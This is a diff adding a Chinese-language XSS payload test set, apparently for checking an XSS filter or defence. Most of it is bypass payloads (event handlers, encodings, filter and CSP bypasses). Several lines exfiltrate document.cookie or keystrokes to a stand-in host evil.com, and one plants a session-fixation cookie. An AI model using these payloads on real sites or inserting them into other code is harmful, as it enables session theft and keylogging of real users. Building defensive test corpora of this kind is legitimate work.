@@ -1,0 +1,175 @@
+# XSS攻击向量测试集
+# 用于测试XSS防御系统的有效性
+
+# ==================== 存储型XSS测试 ====================
+
+# 基础脚本注入
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+
+# 事件处理器注入
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+
+# JavaScript协议
+javascript:alert('XSS')
+javascript:void(alert('XSS'))
+javascript:alert(document.cookie)
+
+# 标签注入
+<iframe src="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+<applet code="javascript:alert('XSS')">
+
+# 表单注入
+<form action="javascript:alert('XSS')">
+<input type="image" src=x onerror=alert('XSS')>
+
+# SVG注入
+<svg><script>alert('XSS')</script></svg>
+<svg/onload=alert('XSS')>
+<svg onload=alert('XSS')>
+
+# ==================== 反射型XSS测试 ====================
+
+# URL参数注入
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+
+# 编码绕过尝试
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+
+# 大小写绕过
+<ScRiPt>alert('XSS')</ScRiPt>
+<SCRIPT>alert('XSS')</SCRIPT>
+
+# 混合大小写
+<scrIpt>alert('XSS')</scrIpt>
+
+# ==================== DOM型XSS测试 ====================
+
+# 内联脚本注入
+<script>alert('XSS')</script>
+
+# 事件处理器
+<img src=x onerror=alert('XSS')>
+
+# 属性注入
+" onmouseover="alert('XSS')" "
+' onmouseover='alert('XSS')' '
+
+# ==================== 高级绕过技术 ====================
+
+# 双写绕过
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+
+# 不完整标签
+<scr<script>
+ipt>alert('XSS')</script>
+
+# 使用特殊字符
+<�script�>alert('XSS')</�script�>
+
+# Unicode编码
+<script>alert('XSS')</script>
+
+# HTML实体编码
+&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;
+
+# 八进制编码
+\74script\76alert('XSS')\74/script\76
+
+# 十六进制编码
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+
+# ==================== 过滤器绕过 ====================
+
+# 使用img标签
+<img src="x" onerror="alert('XSS')">
+
+# 使用svg标签
+<svg/onload=alert('XSS')>
+
+# 使用body标签
+<body onload=alert('XSS')>
+
+# 使用input标签
+<input onfocus=alert('XSS') autofocus>
+
+# 使用details标签
+<details open ontoggle=alert('XSS')>
+
+# 使用marquee标签
+<marquee onstart=alert('XSS')>
+
+# 使用video标签
+<video onstart=alert('XSS')>
+
+# 使用audio标签
+<audio onstart=alert('XSS')>
+
+# ==================== CSP绕过尝试 ====================
+
+# 使用外部脚本
+<script src="http://evil.com/xss.js"></script>
+
+# 使用eval
+eval('alert("XSS")')
+
+# 使用Function构造函数
+new Function('alert("XSS")')()
+
+# 使用setTimeout
+setTimeout('alert("XSS")', 0)
+
+# 使用setInterval
+setInterval('alert("XSS")', 1000)
+
+# ==================== Cookie窃取尝试 ====================
+
+# 基础cookie窃取
+<script>new Image().src="http://evil.com/steal?c="+document.cookie</script>
+
+# 使用XMLHttpRequest
+<script>var x=new XMLHttpRequest();x.open("GET","http://evil.com/steal?c="+document.cookie);x.send()</script>
+
+# 使用fetch API
+<script>fetch("http://evil.com/steal?c="+document.cookie)</script>
+
+# ==================== 键盘记录器 ====================
+
+# 基础键盘记录
+<script>document.onkeypress=function(e){new Image().src="http://evil.com/log?key="+e.key}</script>
+
+# ==================== 会话劫持 ====================
+
+# 会话固定攻击
+<script>document.cookie="session=attacker_controlled_value;path=/"</script>
+
+# ==================== 测试用例组合 ====================
+
+# 多重编码
+%26lt%3Bscript%26gt%3Balert('XSS')%26lt%3B/script%26gt%3B
+
+# 嵌套编码
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# 混合编码
+<%3Cscript%3Ealert('XSS')%3C/script%3E
+
+# ==================== 有效载荷列表 ====================
+
+# 用于自动化测试的有效载荷
+alert('XSS')
+alert(document.cookie)
+alert(document.domain)
+alert(window.location)
+alert(document.referrer)
